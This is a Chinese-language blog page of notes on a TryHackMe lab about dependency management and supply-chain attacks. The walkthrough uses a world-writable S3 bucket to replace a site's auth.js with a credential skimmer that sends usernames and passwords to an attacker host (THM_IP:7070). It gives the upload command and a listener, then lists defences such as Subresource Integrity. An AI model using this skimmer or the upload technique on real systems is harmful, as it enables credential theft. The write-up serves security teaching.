@@ -1,0 +1,546 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMDependencyManagement | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction在现代，完全从头开始编写的应用程序非常罕见。此外，完全从头开始编写应用程序可能不是一个好主意，因为您很可能会通过尝试重新发明轮子而引入漏洞。相反，现代应用程序广泛使用库和软件开发工具包 (SDK) 来帮助实现应用程序的基本（有时是复杂的）功能，从而使开发人员可以专注于应用程序的关键特性和功能。 这些库和 SDK 被称为依赖项，因为我们的应用程序依赖于它们。虽然依赖项使我们的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMDependencyManagement">
+<meta property="og:url" content="https://blog.mikannse.cn/2025/02/28/THMDependencyManagement/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction在现代，完全从头开始编写的应用程序非常罕见。此外，完全从头开始编写应用程序可能不是一个好主意，因为您很可能会通过尝试重新发明轮子而引入漏洞。相反，现代应用程序广泛使用库和软件开发工具包 (SDK) 来帮助实现应用程序的基本（有时是复杂的）功能，从而使开发人员可以专注于应用程序的关键特性和功能。 这些库和 SDK 被称为依赖项，因为我们的应用程序依赖于它们。虽然依赖项使我们的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2025-02-28T12:59:01.000Z">
+<meta property="article:modified_time" content="2025-02-28T13:18:39.584Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="DevSecOps">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://blog.mikannse.cn/2025/02/28/THMDependencyManagement/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMDependencyManagement',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2025-02-28 21:18:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">313</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMDependencyManagement</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-28T12:59:01.000Z" title="发表于 2025-02-28 20:59:01">2025-02-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-28T13:18:39.584Z" title="更新于 2025-02-28 21:18:39">2025-02-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMDependencyManagement"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在现代，完全从头开始编写的应用程序非常罕见。此外，完全从头开始编写应用程序可能不是一个好主意，因为您很可能会通过尝试重新发明轮子而引入漏洞。相反，现代应用程序广泛使用库和软件开发工具包 (SDK) 来帮助实现应用程序的基本（有时是复杂的）功能，从而使开发人员可以专注于应用程序的关键特性和功能。</p>
+<p>这些库和 SDK 被称为依赖项，因为我们的应用程序依赖于它们。虽然依赖项使我们的生活变得轻松很多，但它们必须得到安全管理，因为它们现在构成了应用程序整体攻击面的一部分。在这个房间里，我们将了解与依赖项管理相关的安全概念，并展示攻击者如何利用特定的依赖项管理问题。</p>
+<p>学习目标</p>
+<p>这个房间将教你以下概念：</p>
+<ul>
+<li>依赖项管理的安全原则</li>
+<li>保护外部和内部依赖项</li>
+<li>依赖项混淆攻击</li>
+</ul>
+<h1 id="What-are-dependencies"><a href="#What-are-dependencies" class="headerlink" title="What are dependencies?"></a>What are dependencies?</h1><p>依赖项的规模</p>
+<p>虽然您可能认为在开发应用程序时编写了大量代码，但与您包含的各种依赖项中实际为您执行操作的代码量相比，这些代码量微不足道。让我们看一个简单的 Python 示例。</p>
+<p>example.py</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">x = numpy.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line">y = numpy.array([<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(x * y)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在此示例中，我们使用 NumPy 库创建两个数组，然后将它们相乘。我们实际上写了大约四行代码。但是，仅第一行 <code>import numpy</code> 就会在后台执行一个 <code>__init__.py</code> 文件，其中包含 400 行代码和另外 30 个导入。保守估计每次导入有 250 行代码，这意味着我们的一行代码执行了大约 8000 行依赖代码！</p>
+<p>如果我们推断这些数据，您可能只负责应用程序中所有代码的 0.01%，依赖项占代码的其余 99.99%！这就是为什么依赖项管理对于任何管道或软件开发生命周期 (SDLC) 流程的安全性至关重要。</p>
+<p>依赖项管理</p>
+<p>依赖项管理是通过 SDLC 流程和 DevOps 管道管理依赖项的过程。我们执行依赖项管理有几个原因：</p>
+<ul>
+<li>了解我们的应用程序使用哪些依赖项可以让我们更好地支持它。</li>
+<li>我们经常希望对依赖项进行版本锁定以提高应用程序的稳定性，因为较新的版本可能会添加新功能或弃用我们的应用程序积极使用的功能。</li>
+<li>我们可以构建已安装所有依赖项的黄金映像，这意味着我们可以执行更快的部署周期。</li>
+<li>当新开发人员入职时，我们可以通过安装所有必需的依赖项来帮助他们设置开发机器。</li>
+<li>我们可以监控用于安全问题的依赖项，以确保依赖项根据需要使用安全修复程序进行升级。</li>
+</ul>
+<p>大多数大型组织都使用依赖项管理工具，例如 <a target="_blank" rel="noopener" href="https://jfrog.com/artifactory/">JFrog Artifactory</a>。这使组织能够从中央位置管理其所有依赖项，并允许将依赖项管理集成到我们的 DevOps 管道中。构建服务器和代理可以在构建或部署应用程序时向依赖项管理器发出请求以提供依赖项。</p>
+<h1 id="Internal-vs-External"><a href="#Internal-vs-External" class="headerlink" title="Internal vs External"></a>Internal vs External</h1><p>虽然依赖项可以使用各种分类进行分类，但对于这个房间，我们将主要关注一种分类，即依赖项的来源。因此，我们的依赖项可以分为外部或内部依赖项。</p>
+<p>外部依赖项</p>
+<p>外部依赖项是在我们组织之外开发和维护的依赖项。通常，这些依赖项是公开可用的（有些是免费的，但有些可以付费购买 SDK）。一些流行的外部依赖项示例包括：</p>
+<ul>
+<li>您从 PyPi 公共存储库安装的任何 Python pip 包。</li>
+<li>JQuery 和任何其他公开可用的 Node 包管理器 (NPM) 库，例如 VueJS 或 NodeJS。</li>
+<li>付费 SDK，例如可用于将验证码集成到您的应用程序中的 Google 的 ReCaptcha SDK。</li>
+</ul>
+<p>外部依赖项包括我们自己未创建的几乎所有依赖项。这意味着我们组织之外的某个人负责维护依赖项。</p>
+<p>内部依赖项</p>
+<p>内部依赖项是由我们组织中的某个人开发的。这些依赖项通常仅供我们组织内部开发的应用程序使用。内部依赖项的一些示例包括：</p>
+<ul>
+<li>一个身份验证库，它标准化了我们所有内部开发的应用程序的身份验证过程。</li>
+<li>一个数据源连接库，它为应用程序提供了各种技术来连接到不同的数据源。</li>
+<li>一个消息转换库，它可以将应用程序消息从特定格式转换为不同的内部应用程序可以读取的格式。</li>
+</ul>
+<p>通常创建内部依赖项是为了标准化内部流程，并确保我们不必每次在另一个应用程序中需要相同的功能时都重新发明轮子。由于我们自己开发这些依赖项，因此我们作为一个组织有责任维护这些依赖项。</p>
+<p>外部与内部</p>
+<p>依赖项的来源不一定会使它更好或更安全。但是，基于依赖项的来源，攻击面是不同的。这意味着我们需要采取不同的安全措施来保护每个依赖项。在这个房间里，我们将讨论针对外部和内部依赖项的这些安全措施，然后再实际利用内部依赖项的安全问题之一。</p>
+<h1 id="Securing-External-Dependencies"><a href="#Securing-External-Dependencies" class="headerlink" title="Securing External Dependencies"></a>Securing External Dependencies</h1><p>如前所述，外部依赖项是由外部方托管、管理和更新的依赖项。外部依赖项是 SLDC 中一个有趣的部分，需要加以保护，因为我们不直接负责依赖项的安全性。不过，如果我们想要一个安全的应用程序，我们就必须管理这些依赖项。在此任务中，让我们在执行供应链攻击之前先了解一下外部依赖项的一些安全问题。</p>
+<p>公共 CVE</p>
+<p>开发外部依赖项的团队不是不会犯错的机器人。他们和我们一样都是人。这意味着他们编写的代码中可能存在漏洞。然而，问题是，一旦开发人员创建了补丁，这些漏洞就会被公开披露，通常是作为通用漏洞和暴露 (CVE)。虽然这是确保开发人员创建补丁的良好做法，但对我们来说，这是一个问题，因为这意味着我们依赖项的特定版本现在容易受到在线向攻击者公布的问题的攻击。</p>
+<p>因此，我们必须尽快做出反应并修补我们的依赖项。但这说起来容易做起来难。我们可能已锁定依赖项的版本以确保应用程序的稳定性。因此，升级到新版本意味着我们首先必须确定此类升级是否会导致不稳定。当您开始谈论依赖项的依赖项时，问题会变得更加严重。可能不是您使用的 SDK 存在漏洞，而是 SDK 的依赖项。由于必须更新该依赖项，我们现在也需要更新我们的 SDK。</p>
+<p>Log4j 就是这种情况可能变得多么严重的典型例子。Log4j 是一个基于 Java 的日志实用程序。它用于几乎所有用 Java 开发的应用程序。当依赖项中发现漏洞时，这导致多个产品变得易受攻击。您可以查看<a target="_blank" rel="noopener" href="https://github.com/cisagov/log4j-affected-db">此处查看受影响产品的完整列表</a>。该列表非常大，超过 1000 种产品，他们按字母顺序对其进行了排序。</p>
+<p>根据发现的漏洞，它将影响与特定依赖项相关的风险。由于 Log4j 的漏洞允许远程代码执行，因此影响巨大。如果您想进一步探讨此问题，请查看<a target="_blank" rel="noopener" href="https://tryhackme.com/room/solar">此房间</a>。</p>
+<p>供应链攻击</p>
+<p>即使依赖项没有任何漏洞并保持最新，它们仍可用于攻击系统和服务。随着越来越多的组织变得安全意识强，攻击者更难入侵它们，攻击者不得不变得更加狡猾。</p>
+<p>攻击者不是试图直接攻击已经强化的应用程序，而是瞄准应用程序的依赖项之一，该依赖项可能是由没有如此大安全预算的较小团队创建的。这些间接攻击方法称为供应链攻击。</p>
+<p>一个高级持续威胁 (APT) 组织，即 MageCart 组织，因执行此类攻击而臭名昭著。以下是他们行动的一些亮点：</p>
+<ul>
+<li>入侵英国航空公司在线门户的支付门户，导致客户信用卡被盗，英国航空公司被罚款 2.3 亿美元。</li>
+<li>通过在各种应用程序的各种支付门户中嵌入盗刷器，入侵超过 100,000 名客户的信用卡。</li>
+<li>入侵超过 10,000 个 AWS S3 存储桶，并在这些存储桶中找到的任何 JavaScript 中嵌入恶意软件。</li>
+</ul>
+<p>MageCart 小组表明，您实际上不必直接针对应用程序。入侵应用程序使用的依赖项更有利可图。这些供应链攻击甚至更有效，因为依赖项可能被多个应用程序使用。这意味着入侵单个依赖项可能导致多个应用程序被入侵。</p>
+<p>入侵依赖项有多种方式，但到目前为止，最常见的方式是当依赖项托管不安全时，允许攻击者更改依赖项。例如，这可能是配置了全球可写权限的 S3 存储桶。攻击者可以滥用这些权限，用恶意代码覆盖托管依赖项。</p>
+<p>利用供应链</p>
+<p>让我们尝试执行供应链攻击。我们将模拟供应链攻击。启动连接的机器 AttackBox，并在机器处于活动状态后使用 AttackBox 上的 FireFox 导航到 <a target="_blank" rel="noopener" href="http://10.10.193.210:8000/%E3%80%82%E6%82%A8%E5%B0%86%E7%9C%8B%E5%88%B0%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E9%97%A8%E6%88%B7%E3%80%82">http://10.10.193.210:8000/。您将看到这是一个简单的身份验证门户。</a></p>
+<p>在继续之前，我们需要嵌入主机名条目来模拟面向互联网的 S3 存储桶。在您的攻击机器上执行以下命令，将主机名注入您的 /etc/hosts 文件中：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo bash -c "echo '10.10.193.210 cdn.tryhackme.loc' &gt;&gt; /etc/hosts"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注入后，您可以刷新网页并看到依赖项正在加载。如果您检查应用程序的代码（右键单击-&gt;查看源代码），您将看到它从 cdn.tryhackme.loc 中提取依赖项。让我们进一步检查一下这个依赖项。打开指向该依赖项的链接，它应该允许您下载一个名为 auth.js 的 JavaScript 库：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'txtPassword'</span>);</span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">"keypress"</span>, <span class="keyword">function</span>(<span class="params">event</span>) {    </span><br><span class="line">	<span class="keyword">if</span> (event.<span class="property">key</span> == <span class="string">"Enter"</span>) {</span><br><span class="line">		event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"loginSubmit"</span>).<span class="title function_">click</span>();</span><br><span class="line">	}</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>仔细查看此库中的代码，似乎添加了一个 JS 事件，该事件将监视密码文本框的按键，并在用户按下 Enter 键时自动提交登录表单。由于代码中没有真正的漏洞，让我们看看依赖项托管在哪里。</p>
+<p>如果我们在对 <a target="_blank" rel="noopener" href="http://cdn.tryhackme.loc:9444/libraries">http://cdn.tryhackme.loc:9444/libraries</a> 的请求中后退一步，我们可以看到这似乎是托管依赖项的 S3 存储桶：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要快速查看团队是否错误配置了 S3 存储桶以授予全球可写权限，可以尝试一个简单的 PUT 请求：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行此请求时，似乎我们得到了 HTTP 200 OK。我们还可以看到，我们能够使用 <a target="_blank" rel="noopener" href="http://cdn.tryhackme.loc:9444/libraries/test.js">http://cdn.tryhackme.loc:9444/libraries/test.js</a> 下载这个新文件。这看起来是供应链攻击的迹象！此时，我们可以通过几种不同的方式利用这个全球可写的 S3 存储桶来引发供应链攻击，但我们将通过嵌入凭据窃取器来简化操作，当用户单击提交时，该窃取器会向我们发送用户的凭据。</p>
+<p>下载 auth.js 依赖项并修改代码，使其看起来像这样：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'txtPassword'</span>);</span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">"keypress"</span>, <span class="keyword">function</span>(<span class="params">event</span>) {    </span><br><span class="line">	<span class="keyword">if</span> (event.<span class="property">key</span> == <span class="string">"Enter"</span>) {</span><br><span class="line">		event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">const</span> oReq = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="keyword">var</span> user = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'txtUsername'</span>).<span class="property">value</span>;</span><br><span class="line">            <span class="keyword">var</span> pass = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'txtPassword'</span>).<span class="property">value</span>;</span><br><span class="line">            oReq.<span class="title function_">open</span>(<span class="string">"GET"</span>, <span class="string">"http://THM_IP:7070/item?user="</span> + user + <span class="string">"&amp;pass="</span> + pass);</span><br><span class="line">            oReq.<span class="title function_">send</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span>(err) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">        }</span><br><span class="line">		<span class="keyword">function</span> <span class="title function_">sleep</span> (time) {</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, time));</span><br><span class="line">                }</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">5000</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    		    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"loginSubmit"</span>).<span class="title function_">click</span>();</span><br><span class="line">                });</span><br><span class="line">	}</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>代码解释</strong>：确保将 THM_IP 修改为您的 TryHackMe VPN 的 IP 或 AttackBox IP，因为我们希望回调到此主机。注入相当简单。一旦用户按下 Enter 提交其凭据，我们就会向我们的主机发出 XHR（XMLHTTPRequest）请求，其中目标的用户名和密码作为参数嵌入在请求中。您会注意到一些代码行用于创建睡眠函数，然后在单击按钮之前使用该睡眠函数。这是为了确保恶意 XHR 请求在页面转换发生之前已完成，否则现代浏览器将阻止请求发生。</p>
+<p>让我们用嵌入的 skimmer 覆盖现有的 auth.js 文件：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以托管一整台服务器来接收击键，但是让我们使用 Python 服务器来简化它：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以自己使用该网站来测试我们的 skimmer 是否正常工作。填写表格，输入密码后按回车键，你应该可以拦截凭证：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&amp;pass=test HTTP/1.1" 404 -</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果这有效，我们现在只需要等待某人进行身份验证！给它 5 分钟，你应该就能拦截来自实际用户的凭据！一旦您拦截了用户的凭据，请使用它们对网站进行身份验证并恢复标志！</p>
+<p>防御</p>
+<p>很难防御针对外部依赖项的攻击，因为每天都会发现许多新的漏洞。但是，我们可以采取某些措施来限制风险：</p>
+<ul>
+<li>确保定期更新和修补依赖项。如果发现足够严重的漏洞，这将包括紧急修补依赖项。</li>
+<li>有时可以复制依赖项并将其托管在内部。这将减少攻击面。</li>
+<li>子资源完整性可用于防止加载被篡改的 JS 库。在 HTML 包含中，可以添加 JS 库的哈希值。现代 Web 浏览器将验证 JS 库的哈希值，如果不匹配，则不会加载该库。</li>
+</ul>
+<h1 id="Securing-Internal-Dependencies"><a href="#Securing-Internal-Dependencies" class="headerlink" title="Securing Internal Dependencies"></a>Securing Internal Dependencies</h1><p>内部依赖项是我们在组织内部开发的任何库或 SDK。因此，我们负责依赖项及其管理的所有安全方面。如前所述，创建内部依赖项的主要原因是确保我们不必在每次开发应用程序时都重新发明轮子。内部依赖项使我们能够标准化某些流程，例如身份验证、注册和通信。</p>
+<p>安全问题</p>
+<p>内部依赖项具有与外部依赖项类似的安全问题。虽然内部依赖项使我们能够标准化流程，但如果依赖项存在漏洞，它将影响组织中的多个不同应用程序。因此，我们必须在发布依赖项供使用之前对其进行安全测试。</p>
+<p>另一个问题是，内部依赖项可以非常快地成为遗留代码。创建和维护依赖项的开发人员已经开始在其他地方工作，这意味着依赖项不再接收更新。如果在多个应用程序中使用此类依赖项，则如果发现漏洞，它可能会成为一个问题。如果文档没有保持最新，让新人负责依赖项，这个问题只会变得更糟。</p>
